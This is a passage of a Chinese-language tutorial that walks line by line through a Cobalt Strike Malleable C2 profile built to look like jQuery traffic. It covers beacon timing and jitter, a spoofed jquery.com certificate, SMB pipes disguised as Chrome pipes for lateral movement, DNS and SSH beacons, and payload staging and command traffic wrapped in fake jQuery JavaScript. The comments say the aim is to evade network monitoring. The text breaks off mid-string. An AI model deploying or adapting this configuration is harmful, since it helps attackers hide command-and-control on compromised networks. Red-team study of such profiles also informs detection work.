<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>  set local_option &quot;value&quot;;
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>  client{
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    # customize client indicators
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>  }
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>  server{
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>    # customize server indicators
<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>  }
<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>}
</code></pre></div>
<p>实际上就是很简单 , 就是set 和 一些协议上的配置
下面会以 jquery-c2.4.5-jx.profile 文件为例来解释其中的各个配置项的作用</p>
<h3 id="_2">全局变量<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># Malleable C2 Profile
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a># Version: CobaltStrike 4.5 
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a># File: jquery-c2.4.5.profile
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a># Description: 
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>#   c2 profile attempting to mimic a jquery.js request #   uses signed certificates
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>#   or self-signed certificates
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a># Authors: @joevest, @andrewchiles, @001SPARTaN ### Global Option Block
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a># 设置全局变量sample_name , 值是当前文件名
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>set sample_name &quot;jQuery CS 4.5 Profile&quot;;
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a># 设置心跳包的时间 , 单位毫秒
<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>set sleeptime &quot;1000&quot;;    # 45 Seconds
<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a># set sleeptime &quot;&lt;60000&gt;&quot;; # 1  Minute , 默认的
<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a># 设置心跳包时间的波动范围 45 +- 45*37% 
<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>set jitter &quot;50&quot;;   # % jitter
<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>
<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a># 意味着每次HTTP服务器响应时，都会附加一个长度在0到100个字符之间的随机字符串。这样做的目的是为了增加服务器响应的大小的不可预测性，使得Cobalt Strike的通信模式更难以通过网络监控工具被识别和分析。
<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>set data_jitter &quot;100&quot;; 
<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>
<a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a># 设置全局的UA头
<a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>set useragent &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;;
</code></pre></div>
<h3 id="https-certificate-ssl">https-certificate ssl证书配置<a class="headerlink" href="#https-certificate-ssl" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>https-certificate {
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    set C   &quot;US&quot;;    #国家
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    set CN  &quot;jquery.com&quot;;
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>    set O   &quot;jQuery&quot;;
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>    set OU  &quot;Certificate Authority&quot;;
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    set validity &quot;365&quot;;
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>    set keystore &quot;cobaltstrike.store&quot;; # 证书文件
<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>    set password &quot;1qazwsx&quot;;  # 证书密码
<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>}
</code></pre></div>
<p><img alt="截图" src="e9c5aed5da6ed5444d81c40cc5836e0f.png" /></p>
<p>证书密码指的是上面的密钥库口令。</p>
<h3 id="smbtcp-smb">SMB和TCP , smb会在横向渗透使用到<a class="headerlink" href="#smbtcp-smb" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>### TCP Beacon 监听端口
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>set tcp_port &quot;42585&quot;;
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>set tcp_frame_header &quot;\x80&quot;;
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>### SMB Beacon 
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>set pipename         &quot;mojo.5688.8052.183894939787088877##&quot;; # Common Chrome named pipe  smb管道的名字
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>set pipename_stager  &quot;mojo.5688.8052.35780273329370473##&quot;; # Common Chrome named pipe   smb stager管道的名字
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>set smb_frame_header &quot;\x80&quot;;
</code></pre></div>
<h3 id="dns-beacon-dns">DNS beacon , 不经常使用 , 但是对于只有DNS协议出网的设备可以使用<a class="headerlink" href="#dns-beacon-dns" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>dns-beacon {
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>    set dns_idle           &quot;74.125.196.113&quot;; #google.com (change this to match your campaign)第一次dns查询的地址
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    set dns_max_txt        &quot;252&quot;;  最大查询次数 , 255以下 , 能被4整除
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>    set dns_sleep          &quot;0&quot;; #    Force a sleep prior to each individual DNS request. (in milliseconds)  sleep时间
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>    set dns_ttl            &quot;5&quot;; # ttl值
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>    set maxdns             &quot;255&quot;;  # 最大dns服务转接数量
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>    set dns_stager_prepend &quot;.resources.123456.&quot;;  #  # 使用dns协议的马,pe头追加的内容
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>    set dns_stager_subhost &quot;.feeds.123456.&quot;;  #  # 子域名的查询配置
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>    # DNS subhosts override options, added in version 4.3
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>    set beacon           &quot;a.bc.&quot;;
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    set get_A            &quot;b.1a.&quot;;
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>    set get_AAAA         &quot;c.4a.&quot;;
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>    set get_TXT          &quot;d.tx.&quot;;
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>    set put_metadata     &quot;e.md.&quot;;
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>    set put_output       &quot;f.po.&quot;;
<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>    set ns_response      &quot;zero&quot;;
<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>}
</code></pre></div>
<h3 id="ssh-beacons-sshbeacon">SSH beacons: 配置用于横向移动的SSH伪Beacon。<a class="headerlink" href="#ssh-beacons-sshbeacon" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>set ssh_banner        &quot;OpenSSH_7.4 Debian (protocol 2.0)&quot;;  # SSH连接的banner信息
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>set ssh_pipename      &quot;wkssvc##&quot;; # 定义了用于SSH伪Beacon通信的命名管道的名称前缀,##是一个占位符
</code></pre></div>
<p>http-stager 块是用来自定义HTTP阶段化（staging）过程的配置。阶段化是Cobalt Strike中的一个重要概念，它指的是将第二阶段的有效载荷（即用于后渗透测试的代码）传输到已经受到攻击者控制的主机上的过程。</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a># 用于指定是否启用通过HTTP、HTTPS或DNS进行阶段化(第二阶段)的有效载荷（payload）托管。
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>set host_stage &quot;true&quot;; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>http-stager {  
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    set uri_x86 &quot;/jquery-3.3.1.slim.min.js&quot;;
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    set uri_x64 &quot;/jquery-3.3.2.slim.min.js&quot;;
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    server {
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>        header &quot;Server&quot; &quot;NetDNA-cache/2.2&quot;;
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>        header &quot;Cache-Control&quot; &quot;max-age=0, no-cache&quot;;
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>        header &quot;Pragma&quot; &quot;no-cache&quot;;
<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>        header &quot;Connection&quot; &quot;keep-alive&quot;;
<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>        header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;
<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>        output {
<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>            # 2nd Line            
<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>            prepend &quot;!function(e,t){\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)}:t(e)}(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t){\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e}var b=\&quot;3.3.1\&quot;,w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\&quot;object\&quot;==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t){l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\&quot;\r&quot;;
<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>            # 1st Line
<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>            prepend &quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;;
<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>            append &quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)}}),w.proxy=function(e,t){var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))},\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});&quot;;
<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>            print;
<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>        }
<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>    }
<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>    client {
<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;
<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>        header &quot;Accept-Language&quot; &quot;en-US,en;q=0.5&quot;;
<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>        #header &quot;Host&quot; &quot;code.jquery.com&quot;;
<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>        header &quot;Referer&quot; &quot;http://code.jquery.com/&quot;;
<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>    }
<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>}
</code></pre></div>
<h3 id="http-config-httphttps">http-config , 不单单是http实际上也是https的全局响应头配置<a class="headerlink" href="#http-config-httphttps" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>http-config {
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>    set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;;
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>    header &quot;Server&quot; &quot;Apache&quot;;
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    header &quot;Keep-Alive&quot; &quot;timeout=10, max=100&quot;;
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    header &quot;Connection&quot; &quot;Keep-Alive&quot;;
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    set trust_x_forwarded_for &quot;true&quot;;
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>    set block_useragents &quot;curl*,lynx*,wget*&quot;;
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>}
</code></pre></div>
<h3 id="http-get-teamservercsget">http-get (无缩进要求) , 命令的下发相当于是teamserver(cs服务端)向受害者发送一个get请求<a class="headerlink" href="#http-get-teamservercsget" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>http-get {
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a># 下发命令访问的uri
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>    set uri &quot;/jquery-3.3.1.min.js&quot;;
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>    # 请求方法
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>    set verb &quot;GET&quot;;
<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>    # 客户端配置
<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>    client {
<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>    # 请求头配置
<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;
<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>        #header &quot;Host&quot; &quot;code.jquery.com&quot;;
<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>        header &quot;Referer&quot; &quot;http://code.jquery.com/&quot;;
<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>        # 元数据配置
<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>        metadata {
<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>            base64url;
<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>            prepend &quot;__cfduid=&quot;;
<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>            header &quot;Cookie&quot;;
<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>        }
<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>    }
<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>    # 服务端配置
<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>    server {
<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>    # 响应头设置
<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>        header &quot;Server&quot; &quot;NetDNA-cache/2.2&quot;;
<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>        header &quot;Cache-Control&quot; &quot;max-age=0, no-cache&quot;;
<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>        header &quot;Pragma&quot; &quot;no-cache&quot;;
<a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>        header &quot;Connection&quot; &quot;keep-alive&quot;;
<a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>        header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;
<a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>        # # 输出信息
<a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>        output {   
<a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a>            mask;
<a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>            base64url;
<a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
<a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>            # 2nd Line    
<a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>            # 响应中html页面头部信息
<a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>            prepend &quot;!function(e,t){\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)}:t(e)}(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t){\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e}var b=\&quot;3.3.1\&quot;,w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\&quot;object\&quot;==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\&quot;[object 